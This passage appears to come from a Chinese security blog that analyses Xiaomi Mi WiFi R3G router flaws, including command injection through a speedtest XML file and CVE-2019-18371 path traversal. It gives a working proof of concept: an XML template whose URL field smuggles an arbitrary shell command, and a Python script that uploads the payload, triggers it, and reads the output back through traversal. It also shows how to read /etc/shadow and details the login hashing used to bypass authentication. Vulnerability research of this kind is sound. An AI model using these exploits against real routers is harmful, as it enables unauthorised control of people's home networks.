class="string">&quot;des&quot;</span>] = XQBackup.getdes()</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            code = <span class="number">1629</span></span><br><span class="line">        <span class="keyword">end</span></span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line">    <span class="keyword">if</span> code ~= <span class="number">0</span> <span class="keyword">then</span></span><br><span class="line">        result[<span class="string">&quot;msg&quot;</span>] = XQErrorUtil.getErrorMessage(code)</span><br><span class="line">        LuciFs.unlink(uploadFilepath)</span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line">    result[<span class="string">&quot;code&quot;</span>] = code</span><br><span class="line">    LuciHttp.write_json(result)</span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure>

<p>其中调用<code>XQBackup.extract(uploadFilepath)</code>进行解压</p>
<figure class="highlight lua"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- 0:succeed</span></span><br><span class="line"><span class="comment">-- 1:file does not exist</span></span><br><span class="line"><span class="comment">-- 2:no description file</span></span><br><span class="line"><span class="comment">-- 3:no mbu file</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">extract</span><span class="params">(filepath)</span></span></span><br><span class="line">    <span class="keyword">local</span> fs = <span class="built_in">require</span>(<span class="string">&quot;nixio.fs&quot;</span>)</span><br><span class="line">    <span class="keyword">local</span> tarpath = filepath</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> tarpath <span class="keyword">then</span></span><br><span class="line">        tarpath = TARMBUFILE</span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> fs.access(tarpath) <span class="keyword">then</span></span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span></span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line">    <span class="built_in">os</span>.<span class="built_in">execute</span>(<span class="string">&quot;cd /tmp; tar -xzf &quot;</span>..tarpath..<span class="string">&quot; &gt;/dev/null 2&gt;/dev/null&quot;</span>)</span><br><span class="line">    <span class="built_in">os</span>.<span class="built_in">execute</span>(<span class="string">&quot;rm &quot;</span>..tarpath..<span class="string">&quot; &gt;/dev/null 2&gt;/dev/null&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> fs.access(DESFILE) <span class="keyword">then</span></span><br><span class="line">        <span class="keyword">return</span> <span class="number">2</span></span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> fs.access(MBUFILE) <span class="keyword">then</span></span><br><span class="line">        <span class="keyword">return</span> <span class="number">3</span></span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span></span><br></pre></td></tr></table></figure>

<p>可知，<code>/tmp</code>目录下的任意文件可控</p>
<blockquote>
<p>/usr/bin/upload_speedtest,/usr/bin/download_speedtest<code>等会读取</code>/tmp/speedtest_urls.xml`并提取url直接进行命令拼接，且这几个脚本可以通过web接口调用</p>
</blockquote>
<p>举例，查看<code>/usr/bin/download_speedtest</code>文件</p>
<figure class="highlight lua"><table><tr><td class="code"><pre><span class="line">#!/usr/bin/env lua</span><br><span class="line"><span class="comment">-- ...</span></span><br><span class="line"><span class="keyword">local</span> cfg = &#123;</span><br><span class="line"><span class="comment">-- ...</span></span><br><span class="line">	[<span class="string">&#x27;xmlfile&#x27;</span>] = <span class="string">&quot;/usr/share/speedtest.xml&quot;</span>,</span><br><span class="line">        [<span class="string">&#x27;tmp_speedtest_xml&#x27;</span>] = <span class="string">&quot;/tmp/speedtest_urls.xml&quot;</span>,</span><br><span class="line">&#125;</span><br><span class="line">VERSION=<span class="string">&quot;__UNDEFINED__&quot;</span></span><br><span class="line"><span class="comment">-- ...</span></span><br><span class="line"><span class="comment">-- 测试网速使用的url文件为，若存在/tmp/speedtest_urls.xml则使用，否则用/usr/share/speedtest.xml</span></span><br><span class="line"><span class="keyword">local</span> filename = <span class="string">&quot;&quot;</span></span><br><span class="line">filexml = <span class="built_in">io</span>.<span class="built_in">open</span>(cfg.tmp_speedtest_xml)</span><br><span class="line"><span class="keyword">if</span> filexml <span class="keyword">then</span></span><br><span class="line">    filexml:<span class="built_in">close</span>()</span><br><span class="line">    filename = cfg.tmp_speedtest_xml</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">    filename = cfg.xmlfile</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">local</span> pp = <span class="built_in">io</span>.<span class="built_in">open</span>(filename)</span><br><span class="line"><span class="keyword">local</span> line = pp:<span class="built_in">read</span>(<span class="string">&quot;*line&quot;</span>)</span><br><span class="line"><span class="keyword">local</span> size = <span class="number">0</span></span><br><span class="line"><span class="keyword">local</span> resources = &#123;&#125;</span><br><span class="line"><span class="keyword">local</span> u = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">local</span> pids = &#123;&#125;</span><br><span class="line"><span class="comment">-- ...</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">wget_work</span><span class="params">(url)</span></span></span><br><span class="line">	<span class="keyword">local</span> _url = url</span><br><span class="line">	pid = posix.fork()</span><br><span class="line">	<span class="keyword">if</span> pid &lt; <span class="number">0</span> <span class="keyword">then</span></span><br><span class="line">		<span class="built_in">print</span>(<span class="string">&quot;fork error&quot;</span>)</span><br><span class="line">		<span class="keyword">return</span> <span class="number">-1</span></span><br><span class="line">	<span class="keyword">elseif</span> pid &gt; <span class="number">0</span> <span class="keyword">then</span></span><br><span class="line">		<span class="comment">--print(string.format(&quot;child pid %d\n&quot;, pid))</span></span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">        <span class="comment">-- 拼接命令，最终在这里执行</span></span><br><span class="line">		<span class="built_in">os</span>.<span class="built_in">execute</span>(<span class="string">&#x27;for i in $(seq &#x27;</span>.. <span class="built_in">math</span>.<span class="built_in">floor</span>(cfg.nr/cfg.nc) ..<span class="string">&#x27;); do wget &#x27;</span>.. url  ..</span><br><span class="line">		<span class="string">&quot; -q -O /dev/null; done&quot;</span>)</span><br><span class="line">	<span class="keyword">end</span></span><br><span class="line">	<span class="keyword">return</span> pid</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> line <span class="keyword">do</span></span><br><span class="line">    <span class="comment">-- 从文件中提取url， 这里提取没有进行过滤</span></span><br><span class="line">	<span class="keyword">local</span> _, _, url = <span class="built_in">string</span>.<span class="built_in">find</span>(line,<span class="string">&#x27;&lt;item url=&quot;(.*)&quot;/&gt;&#x27;</span>)</span><br><span class="line">	<span class="keyword">if</span> url <span class="keyword">then</span></span><br><span class="line">		<span class="built_in">table</span>.<span class="built_in">insert</span>(resources, url)</span><br><span class="line">	<span class="keyword">end</span></span><br><span class="line">	line = pp:<span class="built_in">read</span>(<span class="string">&quot;*line&quot;</span>)</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line">pp:<span class="built_in">close</span>()</span><br><span class="line"></span><br><span class="line"><span class="keyword">local</span> urls = mrandom(<span class="number">1</span>, <span class="built_in">table</span>.<span class="built_in">getn</span>(resources), cfg.nc)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> k, v <span class="keyword">in</span> <span class="built_in">ipairs</span>(urls) <span class="keyword">do</span></span><br><span class="line">	<span class="keyword">if</span> VERSION == <span class="string">&quot;LESSMEM&quot;</span> <span class="keyword">then</span></span><br><span class="line">		<span class="keyword">local</span> pid = wget_work_loop(resources[v])</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">        <span class="comment">-- VERSION 为 __UNDEFINED__， url直接作为参数</span></span><br><span class="line">		<span class="keyword">local</span> pid = wget_work(resources[v])</span><br><span class="line">	<span class="keyword">end</span></span><br><span class="line">	<span class="keyword">if</span>(pid == <span class="number">0</span>) <span class="keyword">then</span></span><br><span class="line">		<span class="built_in">os</span>.<span class="built_in">exit</span>(<span class="number">0</span>)</span><br><span class="line">	<span class="keyword">elseif</span>(pid == <span class="number">-1</span>) <span class="keyword">then</span></span><br><span class="line">		done()</span><br><span class="line">	<span class="keyword">end</span></span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure>

<p>调用的地方貌似有好几个，其中<code>/usr/lib/lua/luci/controller/api/xqnetdetect.lua</code>中</p>
<figure class="highlight lua"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">netspeed</span><span class="params">()</span></span></span><br><span class="line">    <span class="keyword">local</span> XQPreference = <span class="built_in">require</span>(<span class="string">&quot;xiaoqiang.XQPreference&quot;</span>)</span><br><span class="line">    <span class="keyword">local</span> XQNSTUtil = <span class="built_in">require</span>(<span class="string">&quot;xiaoqiang.module.XQNetworkSpeedTest&quot;</span>)</span><br><span class="line">    <span class="keyword">local</span> code = <span class="number">0</span></span><br><span class="line">    <span class="keyword">local</span> result = &#123;&#125;</span><br><span class="line">    <span class="keyword">local</span> history = LuciHttp.formvalue(<span class="string">&quot;history&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> history <span class="keyword">then</span></span><br><span class="line">        result[<span class="string">&quot;bandwidth&quot;</span>] = <span class="built_in">tonumber</span>(XQPreference.get(<span class="string">&quot;BANDWIDTH&quot;</span>, <span class="number">0</span>, <span class="string">&quot;xiaoqiang&quot;</span>))</span><br><span class="line">        result[<span class="string">&quot;download&quot;</span>] = <span class="built_in">tonumber</span>(<span class="built_in">string</span>.<span class="built_in">format</span>(<span class="string">&quot;%.2f&quot;</span>, <span class="number">128</span> * result.bandwidth))</span><br><span class="line">        result[<span class="string">&quot;bandwidth2&quot;</span>] = <span class="built_in">tonumber</span>(XQPreference.get(<span class="string">&quot;BANDWIDTH2&quot;</span>, <span class="number">0</span>, <span class="string">&quot;xiaoqiang&quot;</span>))</span><br><span class="line">        result[<span class="string">&quot;upload&quot;</span>] = <span class="built_in">tonumber</span>(<span class="built_in">string</span>.<span class="built_in">format</span>(<span class="string">&quot;%.2f&quot;</span>, <span class="number">128</span> * result.bandwidth2))</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="built_in">os</span>.<span class="built_in">execute</span>(<span class="string">&quot;/etc/init.d/miqos stop&quot;</span>)</span><br><span class="line">        <span class="comment">-- 这里调用了downloadSpeedTest</span></span><br><span class="line">        <span class="keyword">local</span> download = XQNSTUtil.downloadSpeedTest()</span><br><span class="line">        <span class="keyword">if</span> download <span class="keyword">then</span></span><br><span class="line">            result[<span class="string">&quot;download&quot;</span>] = download</span><br><span class="line">            result[<span class="string">&quot;bandwidth&quot;</span>] = <span class="built_in">tonumber</span>(<span class="built_in">string</span>.<span class="built_in">format</span>(<span class="string">&quot;%.2f&quot;</span>, <span class="number">8</span> * download/<span class="number">1024</span>))</span><br><span class="line">            XQPreference.set(<span class="string">&quot;BANDWIDTH&quot;</span>, <span class="built_in">tostring</span>(result.bandwidth), <span class="string">&quot;xiaoqiang&quot;</span>)</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            code = <span class="number">1588</span></span><br><span class="line">        <span class="keyword">end</span></span><br><span class="line">        <span class="keyword">if</span> code ~= <span class="number">0</span> <span class="keyword">then</span></span><br><span class="line">           result[<span class="string">&quot;msg&quot;</span>] = XQErrorUtil.getErrorMessage(code)</span><br><span class="line">        <span class="keyword">end</span></span><br><span class="line">        <span class="built_in">os</span>.<span class="built_in">execute</span>(<span class="string">&quot;/etc/init.d/miqos start&quot;</span>)</span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line">    </span><br><span class="line">    result[<span class="string">&quot;code&quot;</span>] = code</span><br><span class="line">    LuciHttp.write_json(result)</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">downloadSpeedTest</span><span class="params">()</span></span></span><br><span class="line">    <span class="keyword">local</span> speedtest = <span class="string">&quot;/usr/bin/download_speedtest&quot;</span></span><br><span class="line">    <span class="keyword">local</span> speed</span><br><span class="line">    <span class="comment">-- 直接调用sh文件</span></span><br><span class="line">    <span class="keyword">for</span> _, line <span class="keyword">in</span> <span class="built_in">ipairs</span>(LuciUtil.execl(speedtest)) <span class="keyword">do</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> XQFunction.isStrNil(line) <span class="keyword">and</span> line:<span class="built_in">match</span>(<span class="string">&quot;^avg rx:&quot;</span>) <span class="keyword">then</span></span><br><span class="line">            speed = line:<span class="built_in">match</span>(<span class="string">&quot;^avg rx:(%S+)&quot;</span>)</span><br><span class="line">            <span class="keyword">if</span> speed <span class="keyword">then</span></span><br><span class="line">                speed = <span class="built_in">tonumber</span>(<span class="built_in">string</span>.<span class="built_in">format</span>(<span class="string">&quot;%.2f&quot;</span>,speed/<span class="number">8</span>))</span><br><span class="line">            <span class="keyword">end</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">end</span></span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line">    <span class="keyword">return</span> speed</span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure>

<p>所以，我们只需要构造恶意的<code>speedtest_urls.xml</code>文件，构造备份文件，上传备份文件，然后调用网络测试相关的接口，即可以实现命令注入。</p>
<h3 id="poc"><a href="#poc" class="headerlink" title="poc"></a>poc</h3><blockquote>
<p>template.xml</p>
</blockquote>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot;?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">class</span> <span class="attr">type</span>=<span class="string">&quot;1&quot;</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">item</span> <span class="attr">url</span>=<span class="string">&quot;http://dl.ijinshan.com/safe/speedtest/FDFD1EF75569104A8DB823E08D06C21C.dat&quot;</span>/&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">item</span> <span class="attr">url</span>=<span class="string">&quot;http://dl.ijinshan.com/safe/speedtest/FDFD1EF75569104A8DB823E08D06C21C.dat&quot;</span>/&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">item</span> <span class="attr">url</span>=<span class="string">&quot;http://dl.ijinshan.com/safe/speedtest/FDFD1EF75569104A8DB823E08D06C21C.dat&quot;</span>/&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">item</span> <span class="attr">url</span>=<span class="string">&quot;http://dl.ijinshan.com/safe/speedtest/FDFD1EF75569104A8DB823E08D06C21C.dat&quot;</span>/&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">item</span> <span class="attr">url</span>=<span class="string">&quot;http://dl.ijinshan.com/safe/speedtest/FDFD1EF75569104A8DB823E08D06C21C.dat&quot;</span>/&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">item</span> <span class="attr">url</span>=<span class="string">&quot;http://dl.ijinshan.com/safe/speedtest/FDFD1EF75569104A8DB823E08D06C21C.dat&quot;</span>/&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">item</span> <span class="attr">url</span>=<span class="string">&quot;http://dl.ijinshan.com/safe/speedtest/FDFD1EF75569104A8DB823E08D06C21C.dat&quot;</span>/&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">item</span> <span class="attr">url</span>=<span class="string">&quot;http://dl.ijinshan.com/safe/speedtest/FDFD1EF75569104A8DB823E08D06C21C.dat&quot;</span>/&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">item</span> <span class="attr">url</span>=<span class="string">&quot;http://dl.ijinshan.com/safe/speedtest/FDFD1EF75569104A8DB823E08D06C21C.dat&quot;</span>/&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">item</span> <span class="attr">url</span>=<span class="string">&quot;http://dl.ijinshan.com/safe/speedtest/FDFD1EF75569104A8DB823E08D06C21C.dat&quot;</span>/&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">item</span> <span class="attr">url</span>=<span class="string">&quot;http://dl.ijinshan.com/safe/speedtest/FDFD1EF75569104A8DB823E08D06C21C.dat&quot;</span>/&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">item</span> <span class="attr">url</span>=<span class="string">&quot;http://dl.ijinshan.com/safe/speedtest/FDFD1EF75569104A8DB823E08D06C21C.dat&quot;</span>/&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">item</span> <span class="attr">url</span>=<span class="string">&quot;http://dl.ijinshan.com/safe/speedtest/FDFD1EF75569104A8DB823E08D06C21C.dat&quot;</span>/&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">item</span> <span class="attr">url</span>=<span class="string">&quot;http://dl.ijinshan.com/safe/speedtest/FDFD1EF75569104A8DB823E08D06C21C.dat&quot;</span>/&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">class</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">class</span> <span class="attr">type</span>=<span class="string">&quot;2&quot;</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">item</span> <span class="attr">url</span>=<span class="string">&quot;http://192.168.31.1 -q -O /dev/null;&#123;command&#125;&gt;/tmp/1.txt; exit; wget http://192.168.31.1  &quot;</span>/&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">class</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">class</span> <span class="attr">type</span>=<span class="string">&quot;3&quot;</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">item</span> <span class="attr">uploadurl</span>=<span class="string">&quot;http://www.taobao.com/&quot;</span>/&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">item</span> <span class="attr">uploadurl</span>=<span class="string">&quot;http://www.so.com/&quot;</span>/&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">item</span> <span class="attr">uploadurl</span>=<span class="string">&quot;http://www.qq.com/&quot;</span>/&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">item</span> <span class="attr">uploadurl</span>=<span class="string">&quot;http://www.sohu.com/&quot;</span>/&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">item</span> <span class="attr">uploadurl</span>=<span class="string">&quot;http://www.tudou.com/&quot;</span>/&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">item</span> <span class="attr">uploadurl</span>=<span class="string">&quot;http://www.360doc.com/&quot;</span>/&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">item</span> <span class="attr">uploadurl</span>=<span class="string">&quot;http://www.kankan.com/&quot;</span>/&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">item</span> <span class="attr">uploadurl</span>=<span class="string">&quot;http://www.speedtest.cn/&quot;</span>/&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">class</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure>

<blockquote>
<p>remote_command_execution_vulnerability.py</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> tarfile</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="comment"># proxies = &#123;&quot;http&quot;:&quot;http://127.0.0.1:8080&quot;&#125;</span></span><br><span class="line">proxies = &#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">## get stok</span></span><br><span class="line">stok = input(<span class="string">&quot;stok: &quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">## make config file</span></span><br><span class="line">command = input(<span class="string">&quot;command: &quot;</span>)</span><br><span class="line">speed_test_filename = <span class="string">&quot;speedtest_urls.xml&quot;</span></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">&quot;template.xml&quot;</span>,<span class="string">&quot;rt&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">	template = f.read()</span><br><span class="line">data = template.format(command=command)</span><br><span class="line"><span class="comment"># print(data)</span></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">&quot;speedtest_urls.xml&quot;</span>,<span class="string">&#x27;wt&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">	f.write(data)</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> tarfile.open(<span class="string">&quot;payload.tar.gz&quot;</span>, <span class="string">&quot;w:gz&quot;</span>) <span class="keyword">as</span> tar:</span><br><span class="line">	<span class="comment"># tar.add(&quot;cfg_backup.des&quot;)</span></span><br><span class="line">	<span class="comment"># tar.add(&quot;cfg_backup.mbu&quot;)</span></span><br><span class="line">	tar.add(<span class="string">&quot;speedtest_urls.xml&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">## upload config file</span></span><br><span class="line">print(<span class="string">&quot;start uploading config file ...&quot;</span>)</span><br><span class="line">r1 = requests.post(<span class="string">&quot;http://192.168.31.1/cgi-bin/luci/;stok=&#123;&#125;/api/misystem/c_upload&quot;</span>.format(stok), files=&#123;<span class="string">&quot;image&quot;</span>:open(<span class="string">&quot;payload.tar.gz&quot;</span>,<span class="string">&#x27;rb&#x27;</span>)&#125;, proxies=proxies)</span><br><span class="line"><span class="comment"># print(r1.text)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">## exec download speed test, exec command</span></span><br><span class="line">print(<span class="string">&quot;start exec command...&quot;</span>)</span><br><span class="line">r2 = requests.get(<span class="string">&quot;http://192.168.31.1/cgi-bin/luci/;stok=&#123;&#125;/api/xqnetdetect/netspeed&quot;</span>.format(stok), proxies=proxies)</span><br><span class="line"><span class="comment"># print(r2.text)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">## read result file</span></span><br><span class="line">r3 = requests.get(<span class="string">&quot;http://192.168.31.1/api-third-party/download/extdisks../tmp/1.txt&quot;</span>, proxies=proxies)</span><br><span class="line"><span class="keyword">if</span> r3.status_code == <span class="number">200</span>:</span><br><span class="line">	print(<span class="string">&quot;success, vul&quot;</span>)</span><br><span class="line">	print(r3.text)</span><br></pre></td></tr></table></figure>

<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20200904223817264.png" alt="image-20200904223817264"></p>
<h2 id="修复方案"><a href="#修复方案" class="headerlink" title="修复方案"></a>修复方案</h2><ol>
<li>将备份文件格式修改为特定格式，直接读取备份文件内容，而不需使用解压</li>
<li>从<code>speedtest_urls.xml</code>中读取urls时，进行必要的过滤，防止命令注入</li>
</ol>
<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><blockquote>
<p><a href="https://github.com/UltramanGaia/Xiaomi_Mi_WiFi_R3G_Vulnerability_POC/blob/master/report/report.md">https://github.com/UltramanGaia/Xiaomi_Mi_WiFi_R3G_Vulnerability_POC/blob/master/report/report.md</a></p>
</blockquote>
]]></content>
      <categories>
        <category>IOT</category>
      </categories>
      <tags>
        <tag>IOT</tag>
        <tag>XiaoMi</tag>
      </tags>
  </entry>
  <entry>
    <title>(CVE-2019-18371)Xiaomi Mi WiFi R3G 远程命令执行漏洞</title>
    <url>/2020/09/12/IOT/Exploit/%E5%B0%8F%E7%B1%B3/CVE-2019-18371-Xiaomi-Mi-WiFi-R3G-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/</url>
    <content><![CDATA[<h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><p>Xiaomi Mi WiFi R3G是中国小米科技（Xiaomi）公司的一款3G路由器。 Xiaomi Mi WiFi R3G 2.28.23-stable之前版本中存在输入验证错误漏洞。该漏洞源于网络系统或产品未对输入的数据进行正确的验证。</p>
<h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><p>Xiaomi Mi WiFi R3G 2.28.23-stable之前版本</p>
<a id="more"></a>

<h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><h4 id="小米路由器的nginx配置文件错误，导致目录穿越漏洞，实现任意文件读取（无需登录）"><a href="#小米路由器的nginx配置文件错误，导致目录穿越漏洞，实现任意文件读取（无需登录）" class="headerlink" title="小米路由器的nginx配置文件错误，导致目录穿越漏洞，实现任意文件读取（无需登录）"></a>小米路由器的nginx配置文件错误，导致目录穿越漏洞，实现任意文件读取（无需登录）</h4><p>nginx配置不当可导致目录穿越漏洞，</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">location &#x2F;xxx &#123;</span><br><span class="line">  alias &#x2F;abc&#x2F;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可通过访问<code>http://domain.cn/xxx../etc/passwd</code>实现目录穿越访问上级目录及其子目录文件。</p>
<p>在小米路由器的文件<code>/etc/sysapihttpd/sysapihttpd.conf</code>中，存在</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">location &#x2F;api-third-party&#x2F;download&#x2F;extdisks &#123;</span><br><span class="line">	alias &#x2F;extdisks&#x2F;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>故可以任意文件读取根目录下的所有文件，而且是root权限，如访问<code>http://192.168.31.1/api-third-party/download/extdisks../etc/shadow</code></p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20200904224803971.png" alt="image-20200904224803971"></p>
<p>类似的问题，存在多处如</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">location &#x2F;backup&#x2F;log &#123;</span><br><span class="line">	alias &#x2F;tmp&#x2F;syslogbackup&#x2F;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">location &#x2F;api-third-party&#x2F;download&#x2F;public &#123;</span><br><span class="line">	alias &#x2F;userdisk&#x2F;data&#x2F;;</span><br><span class="line">&#125;</span><br><span class="line">location &#x2F;api-third-party&#x2F;download&#x2F;private &#123;</span><br><span class="line">	alias &#x2F;userdisk&#x2F;appdata&#x2F;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="通过任意文件读取，登录路由器后台"><a href="#通过任意文件读取，登录路由器后台" class="headerlink" title="通过任意文件读取，登录路由器后台"></a>通过任意文件读取，登录路由器后台</h4><p>不是明文存储密码，进行一定分析。关注两个过程，一是登录时前端js生成http post请求参数过程，二是验证用户登陆的后端过程。</p>
<p>登录时前端js生成http post请求参数过程</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">var Encrypt &#x3D; &#123;</span><br><span class="line">    key: &#39;a2ffa5c9be07488bbb04a3a47d3c5f6a&#39;,</span><br><span class="line">    iv: &#39;64175472480004614961023454661220&#39;,</span><br><span class="line">    nonce: null,</span><br><span class="line">    init: function()&#123;</span><br><span class="line">        var nonce &#x3D; this.nonceCreat();</span><br><span class="line">        this.nonce &#x3D; nonce;</span><br><span class="line">        return this.nonce;</span><br><span class="line">    &#125;,</span><br><span class="line">    nonceCreat: function()&#123;</span><br><span class="line">        var type &#x3D; 0;</span><br><span class="line">        &#x2F;&#x2F; 自己的mac地址</span><br><span class="line">        var deviceId &#x3D; &#39;&lt;%&#x3D;mac%&gt;&#39;;</span><br><span class="line">        var time &#x3D; Math.floor(new Date().getTime() &#x2F; 1000);</span><br><span class="line">        var random &#x3D; Math.floor(Math.random() * 10000);</span><br><span class="line">        return [type, deviceId, time, random].join(&#39;_&#39;);</span><br><span class="line">    &#125;,</span><br><span class="line">    oldPwd : function(pwd)&#123; &#x2F;&#x2F; oldPwd &#x3D; sha1(nonce + sha1(pwd + &#39;a2ffa5c9be07488bbb04a3a47d3c5f6a&#39;))</span><br><span class="line">        return CryptoJS.SHA1(this.nonce + CryptoJS.SHA1(pwd + this.key).toString()).toString();</span><br><span class="line">    &#125;,</span><br><span class="line">  &#x2F;&#x2F;...</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>可知<code>oldPwd = sha1(nonce + sha1(pwd + &#39;a2ffa5c9be07488bbb04a3a47d3c5f6a&#39;))</code>，登陆请求包为</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST &#x2F;cgi-bin&#x2F;luci&#x2F;api&#x2F;xqsystem&#x2F;login HTTP&#x2F;1.1</span><br><span class="line">Host: 192.168.31.1</span><br><span class="line"></span><br><span class="line">username&#x3D;admin&amp;password&#x3D;c9e62da7b8a0b7a4918c5a90912ba81a9717f9ab&amp;logtype&#x3D;2&amp;nonce&#x3D;0_mac地址_时间戳_5248</span><br></pre></td></tr></table></figure>

<p>验证用户登陆的后端过程</p>
<p>调用<code>XQSecureUtil.checkUser</code>函数</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">function checkUser(user, nonce, encStr)</span><br><span class="line">    -- 从xiaoqiang 配置文件中读取信息</span><br><span class="line">    local password &#x3D; XQPreference.get(user, nil, &quot;account&quot;)</span><br><span class="line">    if password and not XQFunction.isStrNil(encStr) and not XQFunction.isStrNil(nonce) then</span><br><span class="line">        if XQCryptoUtil.sha1(nonce..password) &#x3D;&#x3D; encStr then</span><br><span class="line">            return true</span><br><span class="line">        end</span><br><span class="line">    end</span><br><span class="line">    XQLog.log(4, (luci.http.getenv(&quot;REMOTE_ADDR&quot;) or &quot;&quot;)..&quot; Authentication failed&quot;, nonce, password, encStr)</span><br><span class="line">    return false</span><br><span class="line">end</span><br></pre></td></tr></table></figure>

<p>跟进<code>XQPreference.get</code>函数易知道是从<code>/etc/config/account</code>文件中读取某个字符串，这里称它为<code>accountStr</code>。</p>
<p><code>checkUser</code>函数判断等式为(encStr为参数oldPwd)</p>
